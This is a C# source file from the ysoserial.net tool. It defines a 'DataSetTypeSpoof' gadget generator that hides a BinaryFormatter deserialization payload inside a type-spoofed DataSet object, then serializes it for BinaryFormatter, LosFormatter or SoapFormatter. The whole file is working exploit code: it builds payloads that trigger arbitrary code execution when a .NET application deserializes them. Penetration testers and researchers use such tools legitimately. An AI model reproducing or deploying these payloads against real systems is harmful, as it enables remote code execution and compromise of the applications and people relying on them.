using System;
using System.Collections.Generic;
using System.Data;
using System.IO;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using ysoserial.Helpers;

namespace ysoserial.Generators
{
    public class DataSetTypeSpoofGenerator : DataSetGenerator
    {
        public override string Name()
        {
            return "DataSetTypeSpoof";
        }

        public override string Contributors()
        {
            return "Soroush Dalili, Markus Wulftange, Jang";
        }

        public override string AdditionalInfo()
        {
            return "A more advanced type spoofing which can use any arbitrary types can be seen in TestingArenaHome::SpoofByBinaryFormatterJson or in the DataSetOldBehaviour gadget";
        }

        public override string SupportedBridgedFormatter()
        {
            return Formatters.BinaryFormatter;
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            byte[] binaryFormatterPayload;
            if (BridgedPayload != null)
            {
                binaryFormatterPayload = (byte[])BridgedPayload;
            }
            else
            {
                binaryFormatterPayload = (byte[])new TextFormattingRunPropertiesGenerator().GenerateWithNoTest("BinaryFormatter", inputArgs);
            }

                
            DataSetSpoofMarshal payloadDataSetMarshal = new DataSetSpoofMarshal(binaryFormatterPayload);
            if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
                || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase)
                || formatter.Equals("soapformatter", StringComparison.OrdinalIgnoreCase))
            {
                return Serialize(payloadDataSetMarshal, formatter, inputArgs);
            }
            else
            {
                throw new Exception("Formatter not supported");
            }
        }
    }

    // https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf
    [Serializable]
    public class DataSetSpoofMarshal : ISerializable
    {
        byte[] _fakeTable;

        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            // info.SetType(typeof(System.Data.DataSet));
            info.AssemblyName = "mscorlib";
            info.FullTypeName = typeof(System.Data.DataSet).AssemblyQualifiedName;
            info.AddValue("DataSet.RemotingFormat", System.Data.SerializationFormat.Binary);
            info.AddValue("DataSet.DataSetName", "");
            info.AddValue("DataSet.Namespace", "");
            info.AddValue("DataSet.Prefix", "");
            info.AddValue("DataSet.CaseSensitive", false);
            info.AddValue("DataSet.LocaleLCID", 0x409);
            info.AddValue("DataSet.EnforceConstraints", false);
            info.AddValue("DataSet.ExtendedProperties", (System.Data.PropertyCollection) null);
            info.AddValue("DataSet.Tables.Count", 1);
            info.AddValue("DataSet.Tables_0", _fakeTable);
        }

        public void SetFakeTable(byte[] bfPayload)
        {
            _fakeTable = bfPayload;
        }

        public DataSetSpoofMarshal(byte[] bfPayload)
        {
            SetFakeTable(bfPayload);
        }

        public DataSetSpoofMarshal(object fakeTable) : this(fakeTable, new InputArgs())
        {
            // This won't use anything we might have defined in ysoserial.net BinaryFormatter process (such as minification)
        }

        public DataSetSpoofMarshal(object fakeTable, InputArgs inputArgs)
        {
            MemoryStream stm = new MemoryStream();
            if (inputArgs.Minify)
            {
                ysoserial.Helpers.ModifiedVulnerableBinaryFormatters.BinaryFormatter fmtLocal =
                    new ysoserial.Helpers.ModifiedVulnerableBinaryFormatters.BinaryFormatter();
                fmtLocal.Serialize(stm, fakeTable);
            }
            else
            {
                BinaryFormatter fmt = new BinaryFormatter();
                fmt.Serialize(stm, fakeTable);
            }

            SetFakeTable(stm.ToArray());
        }

        public DataSetSpoofMarshal(MemoryStream ms)
        {
            SetFakeTable(ms.ToArray());
        }
    }
}